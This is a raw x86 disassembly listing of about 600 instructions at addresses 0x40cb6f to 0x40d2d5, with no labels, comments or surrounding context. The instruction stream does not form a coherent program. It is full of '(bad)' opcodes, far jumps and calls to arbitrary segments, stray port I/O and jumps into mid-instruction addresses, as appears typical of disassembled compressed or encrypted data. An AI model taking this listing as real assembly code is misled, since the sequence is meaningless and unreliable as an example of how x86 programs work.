  40cb6f:	aam    0x9c
  40cb71:	mov    ebx,0xe291a51b
  40cb76:	jno    0x40cbba
  40cb78:	fsub   QWORD PTR [ebp+0xd]
  40cb7b:	sub    edx,0x75
  40cb7e:	xor    bl,al
  40cb80:	test   eax,0x280377a4
  40cb85:	xchg   esp,eax
  40cb86:	cmp    ah,dh
  40cb88:	pop    edi
  40cb89:	sub    esp,DWORD PTR [edi]
  40cb8b:	sub    DWORD PTR [esi],0x74
  40cb8e:	inc    ecx
  40cb8f:	push   esp
  40cb90:	sub    dh,BYTE PTR [eax]
  40cb92:	mov    al,ds:0x3ebf4bd5
  40cb97:	clc    
  40cb98:	push   esi
  40cb99:	cli    
  40cb9a:	push   edx
  40cb9b:	or     dl,BYTE PTR [ebx+edi*8]
  40cb9e:	pop    ecx
  40cb9f:	es das 
  40cba1:	push   ss
  40cba2:	dec    edi
  40cba3:	pop    ss
  40cba4:	pop    ss
  40cba5:	pop    esi
  40cba6:	rcr    esp,cl
  40cba8:	xchg   edx,eax
  40cba9:	jmp    0xa724:0xbf4240e3
  40cbb0:	jne    0x40cb8c
  40cbb2:	add    esp,esi
  40cbb4:	test   BYTE PTR [esi-0x3d89ae21],al
  40cbba:	repz push esp
  40cbbc:	fstp   QWORD PTR [ecx-0x4ccde003]
  40cbc2:	push   ecx
  40cbc3:	jne    0x40cc0a
  40cbc5:	test   al,0x21
  40cbc7:	into   
  40cbc8:	into   
  40cbc9:	sub    BYTE PTR [edx+0x65],dh
  40cbcc:	out    0x38,eax
  40cbce:	push   ss
  40cbcf:	sti    
  40cbd0:	ja     0x40cb9a
  40cbd2:	mov    gs,WORD PTR [edi-0x5d]
  40cbd5:	mov    ah,al
  40cbd7:	jbe    0x40cc14
  40cbd9:	pop    ds
  40cbda:	pop    ebx
  40cbdb:	lods   eax,DWORD PTR ds:[esi]
  40cbdc:	and    al,0x10
  40cbde:	popa   
  40cbdf:	mov    esp,0xe2712ef6
  40cbe4:	jg     0x40cc5c
  40cbe6:	mov    dh,0x57
  40cbe8:	ror    ch,1
  40cbea:	inc    eax
  40cbeb:	and    al,0x7f
  40cbed:	pop    ecx
  40cbee:	aaa    
  40cbef:	popa   
  40cbf0:	sbb    eax,0x3e711e5e
  40cbf5:	sahf   
  40cbf6:	add    eax,DWORD PTR [ecx-0x59]
  40cbf9:	gs pop ds
  40cbfb:	ror    BYTE PTR [eax-0x3f],1
  40cbfe:	clc    
  40cbff:	fmul   st,st(7)
  40cc01:	push   ebp
  40cc02:	test   DWORD PTR [esi+0x29],edi
  40cc05:	mov    edx,es
  40cc07:	pushf  
  40cc08:	cmp    al,0x5a
  40cc0a:	or     eax,0x7f1cb17
  40cc0f:	or     ebp,DWORD PTR [ecx-0x52db3554]
  40cc15:	mov    dh,0xe1
  40cc17:	jmp    0xf6bfd765
  40cc1c:	xchg   DWORD PTR [ecx+0x2fd3867],ebp
  40cc22:	jmp    0x40cc77
  40cc24:	or     eax,0x93ee7f38
  40cc29:	xor    edx,DWORD PTR [eax-0x77]
  40cc2c:	xor    al,0xb4
  40cc2e:	push   ebp
  40cc2f:	cld    
  40cc30:	ss jbe 0x40cc38
  40cc33:	pop    ebx
  40cc34:	jnp    0x40cc09
  40cc36:	or     dh,BYTE PTR [ebx]
  40cc38:	mov    bl,0x32
  40cc3a:	mov    ecx,0x57dd8b80
  40cc3f:	dec    esp
  40cc40:	call   0x116:0xd0bb065e
  40cc47:	clflush BYTE PTR [eax+ebp*2+0x1b4cfb78]
  40cc4f:	mov    dh,0xfd
  40cc51:	cld    
  40cc52:	not    BYTE PTR [ebx+0x20]
  40cc55:	push   ecx
  40cc56:	or     eax,0x79ebf57
  40cc5b:	loopne 0x40cc99
  40cc5d:	jl     0x40cc0e
  40cc5f:	xlat   BYTE PTR ds:[ebx]
  40cc60:	in     al,0x33
  40cc62:	mov    dh,0x79
  40cc64:	sbb    DWORD PTR [edx+ebp*8-0x6cbe65],0xffffffc7
  40cc6c:	or     eax,0xf9f7a169
  40cc71:	scas   eax,DWORD PTR es:[edi]
  40cc72:	xlat   BYTE PTR ds:[ebx]
  40cc73:	adc    BYTE PTR [esp+esi*8],dl
  40cc76:	lods   al,BYTE PTR ds:[esi]
  40cc77:	sub    eax,0xf0d15e23
  40cc7c:	sub    DWORD PTR [esi+0x1017b536],edi
  40cc82:	pushf  
  40cc83:	xchg   esi,eax
  40cc84:	fadd   QWORD PTR [edx+ebp*8]
  40cc87:	scas   al,BYTE PTR es:[edi]
  40cc88:	call   0x448a:0x9d3663e2
  40cc8f:	jmp    0x8507bb19
  40cc94:	lahf   
  40cc95:	jae    0x40cc62
  40cc97:	jecxz  0x40ccad
  40cc99:	bound  edx,QWORD PTR [eax-0x1f]
  40cc9c:	push   ds
  40cc9d:	jnp    0x40ccfa
  40cc9f:	das    
  40cca0:	rcl    BYTE PTR [ebp*4-0x7d32c6fa],1
  40cca7:	loope  0x40cc93
  40cca9:	cli    
  40ccaa:	xchg   DWORD PTR [ebx+0xe792260],edx
  40ccb0:	sub    bh,BYTE PTR [eax-0x51ebba21]
  40ccb6:	gs xchg esi,eax
  40ccb8:	pop    eax
  40ccb9:	jmp    0x4e4a:0xd0623515
  40ccc0:	sahf   
  40ccc1:	rcr    DWORD PTR [ebx+ebp*1+0x6e],0xe4
  40ccc6:	call   0xd527:0x8cdece54
  40cccd:	fistp  DWORD PTR [ecx+0xa]
  40ccd0:	jbe    0x40cc78
  40ccd2:	inc    esp
  40ccd3:	push   0xffffffb1
  40ccd5:	mov    al,0xe
  40ccd7:	push   0xffffff8e
  40ccd9:	shl    BYTE PTR [edi+edi*2],0xae
  40ccdd:	mov    bh,0x31
  40ccdf:	pop    ss
  40cce0:	xchg   BYTE PTR [esi],ch
  40cce2:	into   
  40cce3:	xchg   ebx,eax
  40cce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cce5:	sbb    eax,0x74c087c8
  40ccea:	adc    DWORD PTR [ecx-0x4e99ba4f],0xfffffff7
  40ccf1:	mov    DWORD PTR [ecx],edi
  40ccf3:	cwde   
  40ccf4:	loopne 0x40cce6
  40ccf6:	xlat   BYTE PTR ds:[ebx]
  40ccf7:	mov    ds:0x4ce2152,eax
  40ccfc:	aam    0xa9
  40ccfe:	in     al,0x25
  40cd00:	aaa    
  40cd01:	shl    BYTE PTR [ebp+0x39cec285],0xd5
  40cd08:	inc    edx
  40cd09:	inc    edi
  40cd0a:	clc    
  40cd0b:	mov    ecx,0xa073707b
  40cd10:	fs cdq 
  40cd12:	mov    cl,0x69
  40cd14:	adc    DWORD PTR [edx-0x400b7d8],ebx
  40cd1a:	fsub   DWORD PTR [ebp-0x1ba15cd2]
  40cd20:	mov    cl,0xf5
  40cd22:	test   eax,0xc67c0b73
  40cd27:	push   0x7b
  40cd29:	cs in  eax,0xb8
  40cd2c:	out    dx,eax
  40cd2d:	sti    
  40cd2e:	push   ss
  40cd2f:	aas    
  40cd30:	push   ebp
  40cd31:	xchg   edx,eax
  40cd32:	adc    BYTE PTR [ecx-0x2f],al
  40cd35:	or     eax,0x736b865c
  40cd3a:	into   
  40cd3b:	les    esi,FWORD PTR [ebp-0x5a]
  40cd3e:	dec    ecx
  40cd3f:	sbb    edi,ecx
  40cd41:	push   ds
  40cd42:	jns    0x40cd5f
  40cd44:	xor    BYTE PTR [esi],0x37
  40cd47:	int    0xb2
  40cd49:	shld   DWORD PTR [edi-0x10],ebp,0x7c
  40cd4e:	retf   0x630b
  40cd51:	popa   
  40cd52:	popa   
  40cd53:	mov    dh,BYTE PTR [ecx+0x4b238847]
  40cd59:	fstp   DWORD PTR [edi+0x2e747b83]
  40cd5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd60:	cmp    DWORD PTR [edx],eax
  40cd62:	pop    esp
  40cd63:	dec    edx
  40cd64:	and    ecx,ecx
  40cd66:	jecxz  0x40cd87
  40cd68:	cmp    eax,0xa15bddbe
  40cd6d:	add    BYTE PTR ds:0x631ed69e,ch
  40cd73:	jno    0x40cd62
  40cd75:	mov    cl,0x39
  40cd77:	test   al,0x49
  40cd79:	ins    DWORD PTR es:[edi],dx
  40cd7a:	aas    
  40cd7b:	and    dl,dl
  40cd7d:	mov    edx,0x1696378f
  40cd82:	popa   
  40cd83:	jne    0x40cd54
  40cd85:	fcmovb st,st(7)
  40cd87:	xor    esi,ecx
  40cd89:	sbb    al,0x8d
  40cd8b:	out    0x25,eax
  40cd8d:	ror    BYTE PTR [ebx-0x4127b15c],0xfc
  40cd94:	sbb    bl,BYTE PTR [ebp-0x26185d20]
  40cd9a:	aad    0x50
  40cd9c:	dec    esi
  40cd9d:	ins    BYTE PTR es:[edi],dx
  40cd9e:	data16 out 0x6a,al
  40cda1:	cmp    al,0x21
  40cda3:	aad    0x71
  40cda5:	mov    esi,DWORD PTR [ebp+0x21]
  40cda8:	pop    ebp
  40cda9:	or     eax,0x81bd35e8
  40cdae:	xchg   edi,eax
  40cdaf:	mov    eax,0xb372c1e4
  40cdb4:	repnz aaa 
  40cdb6:	fist   WORD PTR [edi+eax*2-0x6c7dd49]
  40cdbd:	leave  
  40cdbe:	jmp    0x40ce12
  40cdc0:	pop    edi
  40cdc1:	pop    edi
  40cdc2:	sub    ch,BYTE PTR [edx+0x54]
  40cdc5:	dec    esp
  40cdc6:	dec    edi
  40cdc7:	bound  ebx,QWORD PTR [ebx+eax*4]
  40cdca:	jg     0x40cd75
  40cdcc:	jl     0x40cde7
  40cdce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdcf:	lahf   
  40cdd0:	scas   al,BYTE PTR es:[edi]
  40cdd1:	les    ecx,FWORD PTR [esi-0x3]
  40cdd4:	mul    ah
  40cdd6:	inc    esp
  40cdd7:	retf   
  40cdd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd9:	mov    ah,0x82
  40cddb:	cmp    al,0x8f
  40cddd:	mov    ebp,esi
  40cddf:	push   es
  40cde0:	nop
  40cde1:	pop    edi
  40cde2:	dec    ecx
  40cde3:	push   0x5a5580b9
  40cde8:	test   edi,0xc976e255
  40cdee:	mov    es,WORD PTR [eax+0x47]
  40cdf1:	(bad)  
  40cdf2:	or     ebx,ecx
  40cdf4:	std    
  40cdf5:	push   ecx
  40cdf6:	jmp    0x2be2:0xaea3538f
  40cdfd:	out    dx,eax
  40cdfe:	shl    BYTE PTR [esi+0x4e3a5d1d],1
  40ce04:	retf   
  40ce05:	sub    BYTE PTR [ebx+0x7237b75a],0x53
  40ce0c:	jge    0x40ce65
  40ce0e:	test   al,0xf4
  40ce10:	add    eax,0x59bac93c
  40ce15:	(bad)  
  40ce16:	loop   0x40ce8a
  40ce18:	xchg   ecx,eax
  40ce19:	xchg   edi,eax
  40ce1a:	add    DWORD PTR [ecx+esi*2+0x8fd75e9],edx
  40ce21:	ret    
  40ce22:	jnp    0x40cea0
  40ce24:	pop    es
  40ce25:	add    eax,0x7b7be256
  40ce2a:	rol    DWORD PTR [ecx+ecx*4+0x25],0x60
  40ce2f:	mov    esp,0xc4fd365e
  40ce34:	mov    dl,0x5f
  40ce36:	xor    al,0xa0
  40ce38:	jmp    0x40cdf9
  40ce3a:	daa    
  40ce3b:	xor    eax,0x486098cb
  40ce40:	add    edi,eax
  40ce42:	pop    ebx
  40ce43:	jg     0x40ce00
  40ce45:	inc    DWORD PTR [ecx+esi*2+0x52b4878]
  40ce4c:	mov    al,0xdb
  40ce4e:	lods   al,BYTE PTR ds:[esi]
  40ce4f:	or     cl,BYTE PTR [edx+esi*1]
  40ce52:	aas    
  40ce53:	dec    ebx
  40ce54:	jmp    0xe9dd110d
  40ce59:	(bad)  
  40ce5a:	out    0xe1,al
  40ce5c:	test   eax,esi
  40ce5e:	out    0x76,al
  40ce60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce61:	pushf  
  40ce62:	xchg   esp,eax
  40ce63:	(bad)  [esi]
  40ce65:	dec    edi
  40ce66:	sub    BYTE PTR [ebx+0x0],al
  40ce69:	leave  
  40ce6a:	xchg   ecx,eax
  40ce6b:	jmp    0xee4b4b4b
  40ce70:	add    dl,al
  40ce72:	jbe    0x40ce31
  40ce74:	xor    BYTE PTR [edx+0x5],0x7b
  40ce78:	xchg   esp,eax
  40ce79:	repz call 0x9be930fe
  40ce7f:	nop
  40ce80:	mov    eax,0x3ad8845b
  40ce85:	pop    ecx
  40ce86:	jp     0x40ce66
  40ce88:	out    dx,al
  40ce89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce8a:	fisubr DWORD PTR [edi]
  40ce8c:	lea    eax,[eax]
  40ce8e:	out    dx,al
  40ce8f:	les    eax,FWORD PTR [ebp+0x4773ffd]
  40ce95:	scas   al,BYTE PTR es:[edi]
  40ce96:	cmp    DWORD PTR [edi+0x212a64be],esp
  40ce9c:	stc    
  40ce9d:	and    BYTE PTR [ecx-0x2],0x2f
  40cea1:	scas   al,BYTE PTR es:[edi]
  40cea2:	pop    ebp
  40cea4:	fst    QWORD PTR [ebp-0x15f699ae]
  40ceaa:	xor    ebp,DWORD PTR [ebx]
  40ceac:	pop    edi
  40cead:	and    DWORD PTR [ecx-0x48],esp
  40ceb0:	mov    esi,0x78a1a0e1
  40ceb5:	mov    edx,0xa2e5c43a
  40ceba:	sub    eax,ecx
  40cebc:	(bad)  
  40cebd:	jne    0x40cf2a
  40cebf:	mov    edi,0x30a7aef2
  40cec4:	int    0xe9
  40cec6:	les    ebx,FWORD PTR es:[eax]
  40cec9:	inc    ebx
  40ceca:	cmp    eax,0xd8d8b070
  40cecf:	int    0xc0
  40ced1:	inc    edx
  40ced2:	inc    ebx
  40ced3:	sbb    ecx,0xb462b983
  40ced9:	xor    eax,0xf0adf40d
  40cede:	jo     0x40ced4
  40cee0:	add    al,0x79
  40cee2:	aam    0xa9
  40cee4:	cwde   
  40cee5:	push   ss
  40cee6:	xchg   ebp,eax
  40cee7:	outs   dx,BYTE PTR ds:[esi]
  40cee8:	mov    bh,BYTE PTR [esi+0x1bf38e1]
  40ceee:	arpl   si,ax
  40cef0:	leave  
  40cef1:	jle    0x40cf04
  40cef3:	mov    edi,0xf43f97d3
  40cef8:	fsub   st(7),st
  40cefa:	scas   al,BYTE PTR es:[edi]
  40cefb:	retf   0x5dc
  40cefe:	test   DWORD PTR [eax+0x2d],ecx
  40cf01:	leave  
  40cf02:	pop    es
  40cf03:	jmp    0x7351a108
  40cf08:	or     DWORD PTR [ecx-0x3d609fd8],esi
  40cf0e:	mov    al,ds:0xe1287766
  40cf13:	das    
  40cf14:	test   DWORD PTR [ebx+0x2f],esp
  40cf17:	sub    ebp,edi
  40cf19:	add    eax,0x50283c07
  40cf1e:	xor    eax,0x23f6e3a9
  40cf23:	loope  0x40cf85
  40cf25:	sub    edi,DWORD PTR [edx-0x54]
  40cf28:	addr16 dec ebx
  40cf2a:	push   esi
  40cf2b:	xchg   ebp,eax
  40cf2c:	push   edi
  40cf2d:	scas   eax,DWORD PTR es:[edi]
  40cf2e:	pop    ebp
  40cf2f:	dec    edi
  40cf30:	sbb    ch,bh
  40cf32:	jmp    0x40cec4
  40cf34:	stc    
  40cf35:	pop    es
  40cf36:	jmp    0x40cf0b
  40cf38:	cmp    edx,DWORD PTR [ecx+edi*2+0x60]
  40cf3c:	ins    DWORD PTR es:[edi],dx
  40cf3d:	ret    
  40cf3e:	cmp    edi,esp
  40cf40:	fs pop ss
  40cf42:	leave  
  40cf43:	push   es
  40cf44:	push   ebx
  40cf45:	test   al,0x59
  40cf47:	shr    BYTE PTR [edx],1
  40cf49:	jge    0x40ced1
  40cf4b:	mov    ds:0xc2606d60,eax
  40cf50:	fistp  WORD PTR ds:0x405f5df1
  40cf56:	rcl    BYTE PTR ds:0x9ffe3977,cl
  40cf5c:	mov    cl,0xb1
  40cf5e:	pop    eax
  40cf5f:	cmp    ah,BYTE PTR [ecx]
  40cf61:	xchg   ebp,eax
  40cf62:	jp     0x40cf25
  40cf64:	sti    
  40cf65:	sbb    eax,0x81bfb346
  40cf6a:	rcl    esp,0x44
  40cf6d:	jbe    0x40ceef
  40cf6f:	push   ecx
  40cf70:	(bad)  
  40cf72:	(bad)  
  40cf73:	sti    
  40cf74:	ret    0x347
  40cf77:	jp     0x40cf24
  40cf79:	cdq    
  40cf7a:	js     0x40cf36
  40cf7c:	xchg   esi,eax
  40cf7d:	jo     0x40cf24
  40cf7f:	mov    esi,0x2f9e1bdf
  40cf84:	mov    cl,0xf2
  40cf86:	lods   al,BYTE PTR ds:[esi]
  40cf87:	(bad)  
  40cf88:	ja     0x40cf1e
  40cf8a:	std    
  40cf8b:	retf   0x95f3
  40cf8e:	rol    BYTE PTR [eax],0x6f
  40cf91:	push   esi
  40cf92:	or     cl,BYTE PTR [ebp-0x6d]
  40cf95:	aam    0xa0
  40cf97:	xor    al,BYTE PTR [ecx+0x4a8f07cf]
  40cf9d:	into   
  40cf9e:	call   0xd8d9182
  40cfa3:	pop    ds
  40cfa4:	(bad)  
  40cfa5:	pop    eax
  40cfa6:	xor    cl,BYTE PTR [ebp+0x560b0c30]
  40cfac:	ficomp DWORD PTR [ebp-0x36999a40]
  40cfb2:	or     ecx,DWORD PTR [ecx]
  40cfb4:	loope  0x40cf4e
  40cfb6:	mov    ch,0x43
  40cfb8:	mov    ds:0x342c9dc9,al
  40cfbd:	stc    
  40cfbe:	cmc    
  40cfbf:	xchg   ecx,eax
  40cfc0:	mov    bh,0xbc
  40cfc2:	cmp    al,0x55
  40cfc4:	retf   
  40cfc5:	lahf   
  40cfc6:	mov    bl,0x85
  40cfc8:	retf   0x61da
  40cfcb:	rcr    DWORD PTR fs:[ecx],cl
  40cfce:	je     0x40d02b
  40cfd0:	push   ebp
  40cfd1:	jge    0x40cf68
  40cfd3:	xchg   DWORD PTR [ebp-0x72df8a82],eax
  40cfd9:	lds    edi,FWORD PTR [esi]
  40cfdb:	ins    BYTE PTR es:[edi],dx
  40cfdc:	pop    edi
  40cfdd:	jp     0x40d019
  40cfdf:	mov    esp,0xd321cd75
  40cfe4:	retf   0x6aa4
  40cfe7:	scas   al,BYTE PTR es:[edi]
  40cfe8:	push   ebp
  40cfe9:	add    al,0xe8
  40cfeb:	sbb    BYTE PTR [eax],0x83
  40cfee:	xor    eax,0xd3d3e0c0
  40cff3:	mov    ebx,0x6ef2727d
  40cff8:	jecxz  0x40d031
  40cffa:	lds    ebx,FWORD PTR [ebx+ebp*2+0x660c7dd0]
  40d001:	xchg   ebp,eax
  40d002:	repz or BYTE PTR [ebp+esi*8+0x5f03153],cl
  40d00a:	xchg   ebx,eax
  40d00b:	and    esp,esp
  40d00d:	inc    esi
  40d00e:	push   ebx
  40d00f:	(bad)  
  40d010:	push   ebx
  40d011:	push   0x49
  40d013:	int3   
  40d014:	outs   dx,BYTE PTR ds:[esi]
  40d015:	lea    ebp,ds:0x81671c1d
  40d01b:	and    eax,edi
  40d01d:	sti    
  40d01e:	aam    0xfc
  40d020:	sub    eax,0x4b5b8520
  40d025:	push   0x98c32120
  40d02a:	mov    ebx,0x185ca0da
  40d02f:	jae    0x40d05d
  40d031:	outs   dx,BYTE PTR ds:[esi]
  40d032:	(bad)  
  40d033:	cmp    BYTE PTR [edi],dl
  40d035:	pop    eax
  40d036:	adc    dx,bx
  40d039:	mov    ?,WORD PTR [ecx+0x31f4c8f0]
  40d03f:	aas    
  40d040:	jb     0x40d083
  40d042:	xor    al,0xdb
  40d044:	fsubr  QWORD PTR [edi-0x52]
  40d047:	dec    esp
  40d048:	adc    esi,eax
  40d04a:	popf   
  40d04b:	repz dec ecx
  40d04d:	sar    DWORD PTR [ecx],1
  40d04f:	xor    BYTE PTR [ebx+0x32],dh
  40d052:	and    eax,0x9500f007
  40d057:	dec    esi
  40d058:	(bad)  
  40d059:	rep lods eax,DWORD PTR ds:[esi]
  40d05b:	add    eax,0xf5608824
  40d060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d061:	ins    DWORD PTR es:[edi],dx
  40d062:	shl    DWORD PTR [edx+0x1f],cl
  40d065:	mov    ah,0xc
  40d067:	jo     0x40d0e0
  40d069:	mov    ds:0xca6ae3e5,al
  40d06e:	call   0xa600:0xcd86b983
  40d075:	stc    
  40d076:	bound  eax,QWORD PTR [edi-0x7d]
  40d079:	loopne 0x40d0b4
  40d07b:	pop    ds
  40d07c:	call   0x1fcd:0x43e2dadf
  40d083:	icebp  
  40d084:	sub    DWORD PTR [ebp+0x45],edi
  40d087:	inc    ecx
  40d088:	dec    eax
  40d089:	into   
  40d08a:	aad    0x84
  40d08c:	out    0xaa,al
  40d08e:	mov    cl,0x22
  40d090:	mov    al,0x2
  40d092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d093:	dec    ebp
  40d094:	pop    ebx
  40d095:	nop
  40d096:	dec    esi
  40d097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d098:	xchg   edx,eax
  40d099:	and    esp,eax
  40d09b:	mov    eax,0x7c5e59ce
  40d0a0:	xchg   esi,eax
  40d0a1:	jl     0x40d0eb
  40d0a3:	and    dl,BYTE PTR [edx+0x5496d407]
  40d0a9:	pusha  
  40d0aa:	pop    edx
  40d0ab:	je     0x40d0a7
  40d0ad:	xchg   esi,edi
  40d0af:	push   ss
  40d0b0:	(bad)  
  40d0b1:	(bad)  
  40d0b2:	inc    esp
  40d0b3:	mov    dh,0x92
  40d0b5:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40d0b7:	pop    ecx
  40d0b8:	inc    ebp
  40d0b9:	js     0x40d0ad
  40d0bb:	sbb    dh,ah
  40d0bd:	sbb    BYTE PTR [ebp-0x70],dh
  40d0c0:	mov    bh,0x35
  40d0c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0c3:	pop    ebx
  40d0c4:	xlat   BYTE PTR ds:[ebx]
  40d0c5:	jge    0x40d051
  40d0c7:	xchg   esp,eax
  40d0c8:	in     eax,dx
  40d0c9:	fnstenv [ecx]
  40d0cb:	mov    fs,WORD PTR [ebx+edi*4-0x5a]
  40d0cf:	sub    DWORD PTR [edi-0xa2b1773],ecx
  40d0d5:	ds dec edi
  40d0d7:	or     ch,BYTE PTR [eax+0x2e]
  40d0da:	test   eax,0x5b5bde06
  40d0df:	in     al,dx
  40d0e0:	call   FWORD PTR [esi]
  40d0e2:	test   eax,0xe0a9cb77
  40d0e7:	aad    0x33
  40d0e9:	not    BYTE PTR [ebp+0x65]
  40d0ec:	mov    dh,0x72
  40d0ee:	sub    ebp,ecx
  40d0f0:	cli    
  40d0f1:	sbb    bh,ch
  40d0f3:	pop    ecx
  40d0f4:	cmp    edx,DWORD PTR [edx-0x63ed4f1e]
  40d0fa:	sbb    ch,BYTE PTR [ecx+0x4b]
  40d0fd:	jbe    0x40d115
  40d0ff:	fadd   QWORD PTR [edx-0x79]
  40d102:	xor    DWORD PTR [ebx],ebx
  40d104:	imul   edx,ecx,0xe360789c
  40d10a:	jle    0x40d0bc
  40d10c:	icebp  
  40d10d:	int3   
  40d10e:	das    
  40d10f:	mov    ds:0x741e236d,al
  40d114:	sub    BYTE PTR [edx+0x29],dh
  40d117:	test   eax,0x5d09c91
  40d11c:	ins    BYTE PTR es:[edi],dx
  40d11d:	loop   0x40d18a
  40d11f:	lods   eax,DWORD PTR ds:[esi]
  40d120:	jnp    0x40d16d
  40d122:	pop    esp
  40d123:	je     0x40d0bf
  40d125:	cwde   
  40d126:	in     al,0x73
  40d128:	mov    ecx,ecx
  40d12a:	cdq    
  40d12b:	cs pusha 
  40d12d:	icebp  
  40d12e:	call   0xa535:0x917184d0
  40d135:	das    
  40d136:	cmc    
  40d137:	jecxz  0x40d0ff
  40d139:	or     DWORD PTR [edi],ecx
  40d13b:	mov    eax,DWORD PTR [ebx+edi*1+0x6a]
  40d13f:	xlat   BYTE PTR ds:[ebx]
  40d140:	fld    TBYTE PTR [esi-0x24]
  40d143:	push   esi
  40d144:	mov    cl,0xb8
  40d146:	pop    ss
  40d147:	iret   
  40d148:	mul    esi
  40d14a:	mov    edx,0xd49cdfdd
  40d14f:	dec    eax
  40d150:	sub    DWORD PTR [esi+0x3bc22930],0xffffffbb
  40d157:	sbb    BYTE PTR [edi+0x79],ah
  40d15a:	(bad)  
  40d15b:	call   0xde20a8bc
  40d160:	and    esi,eax
  40d162:	pop    eax
  40d163:	into   
  40d164:	scas   eax,DWORD PTR es:[edi]
  40d165:	outs   dx,BYTE PTR ds:[esi]
  40d166:	jo     0x40d124
  40d168:	mov    ebx,0xbdd38dbe
  40d16d:	(bad)  
  40d16e:	and    dl,dl
  40d170:	mov    bl,0xd2
  40d172:	into   
  40d173:	sub    al,0xa0
  40d175:	ficom  WORD PTR [esi+0x19011fe2]
  40d17b:	mov    ebx,0x7f11093d
  40d180:	in     eax,0x4
  40d182:	mov    esp,0xe2874255
  40d187:	iret   
  40d188:	shl    BYTE PTR [ecx-0x61],cl
  40d18b:	and    esi,0xd3ea86b5
  40d191:	mov    ds:0x9cf60146,al
  40d196:	arpl   si,bx
  40d198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d199:	sub    ecx,DWORD PTR [ebp-0x5cd36b06]
  40d19f:	adc    BYTE PTR [ecx],bh
  40d1a1:	inc    ebx
  40d1a2:	xchg   esi,eax
  40d1a3:	jge    0x40d127
  40d1a5:	neg    BYTE PTR [esi-0x5886b5a1]
  40d1ab:	or     al,0x3c
  40d1ad:	leave  
  40d1ae:	daa    
  40d1af:	ret    
  40d1b0:	leave  
  40d1b1:	aaa    
  40d1b2:	inc    edx
  40d1b3:	mov    eax,ds:0xb6973076
  40d1b8:	shr    BYTE PTR [eax+0x4b],1
  40d1bb:	mov    ds:0x2c37b907,eax
  40d1c0:	cmp    eax,DWORD PTR [ebx]
  40d1c2:	cmc    
  40d1c3:	mov    esp,0xc7da53c4
  40d1c8:	and    bl,ah
  40d1ca:	rcr    DWORD PTR [edi-0x66],cl
  40d1cd:	int    0xe0
  40d1cf:	cmp    DWORD PTR [edx],0xcc047948
  40d1d5:	dec    edx
  40d1d6:	mov    WORD PTR [esi],fs
  40d1d8:	mov    esi,0xf9da8547
  40d1dd:	jo     0x40d202
  40d1df:	ror    DWORD PTR [eiz*1-0x16911c22],cl
  40d1e6:	push   ds
  40d1e7:	pop    eax
  40d1e8:	jg     0x40d239
  40d1ea:	xchg   ebp,eax
  40d1eb:	jp     0x40d222
  40d1ed:	sub    BYTE PTR [edx+edx*8],bl
  40d1f0:	mov    eax,esp
  40d1f2:	(bad)  
  40d1f4:	jecxz  0x40d272
  40d1f6:	add    eax,0xec82b561
  40d1fb:	sub    al,0xe4
  40d1fd:	and    al,bl
  40d1ff:	imul   edi,DWORD PTR ds:0xd666ad66,0xf00c6664
  40d209:	and    al,0xc
  40d20b:	jmp    0x5a8b1185
  40d210:	pushf  
  40d211:	sti    
  40d212:	aam    0xf
  40d214:	jmp    0x4513:0x522f7254
  40d21b:	push   ss
  40d21c:	push   edx
  40d21d:	mov    cl,0x7b
  40d21f:	fnstenv [ebx+0x6935f984]
  40d225:	lods   al,BYTE PTR ds:[esi]
  40d226:	xor    al,0x31
  40d228:	dec    edx
  40d229:	loope  0x40d25e
  40d22b:	mov    dl,0x82
  40d22d:	push   ss
  40d22e:	jmp    0x40d2ac
  40d230:	div    DWORD PTR ds:0xfa7cb267
  40d236:	imul   ebx,DWORD PTR [ebx+0x69],0xffffffa2
  40d23a:	sub    BYTE PTR [edi],0xed
  40d23d:	xchg   edi,eax
  40d23e:	in     eax,0x6b
  40d240:	push   cs
  40d241:	xchg   edx,eax
  40d242:	gs mov ch,0x99
  40d245:	pop    esi
  40d246:	mov    ebp,0xf9e311a9
  40d24b:	mov    esp,0xec56ab47
  40d250:	fs add dh,BYTE PTR cs:[esi-0x4d]
  40d255:	push   es
  40d256:	jg     0x40d237
  40d258:	sbb    ebp,eax
  40d25a:	cmp    BYTE PTR [edx+0x3d39b3fd],bl
  40d260:	xor    eax,0xeaadb10c
  40d265:	mov    al,ds:0x619c013f
  40d26a:	(bad)  
  40d26b:	pushf  
  40d26c:	aas    
  40d26d:	stos   BYTE PTR es:[edi],al
  40d26e:	adc    BYTE PTR [ebx],bl
  40d270:	inc    edx
  40d271:	enter  0x4d24,0x90
  40d275:	fnstsw WORD PTR [eax+0x32]
  40d278:	(bad)  
  40d279:	mov    esp,0x1a0fa236
  40d27e:	fprem1 
  40d280:	mov    bh,0xfc
  40d282:	push   ecx
  40d283:	and    BYTE PTR [ebx-0x67594ef0],dh
  40d289:	fst    DWORD PTR [ebp+0x7a]
  40d28c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d28d:	sbb    eax,0x252c5394
  40d292:	aas    
  40d293:	in     al,0x2c
  40d295:	jmp    0x293b7fd2
  40d29a:	sar    BYTE PTR [eax-0x148f6b06],1
  40d2a0:	cwde   
  40d2a1:	repnz pushw cs
  40d2a4:	and    DWORD PTR es:[esi+ebp*2+0x3a],eax
  40d2a9:	add    al,0x2d
  40d2ab:	jp     0x40d2ad
  40d2ad:	xchg   edi,eax
  40d2ae:	sbb    edi,edx
  40d2b0:	and    edi,DWORD PTR [edi+0x17a74607]
  40d2b6:	and    eax,DWORD PTR ds:0x17125902
  40d2bc:	leave  
  40d2bd:	sub    dl,BYTE PTR [edi]
  40d2bf:	xor    BYTE PTR [ebx+0x10],ch
  40d2c2:	mov    edx,0x339d468c
  40d2c7:	retf   0x196f
  40d2ca:	mov    ch,al
  40d2cc:	repnz frstor [ecx-0x52]
  40d2d0:	or     eax,0x4c22e202
  40d2d5:	pop    esp
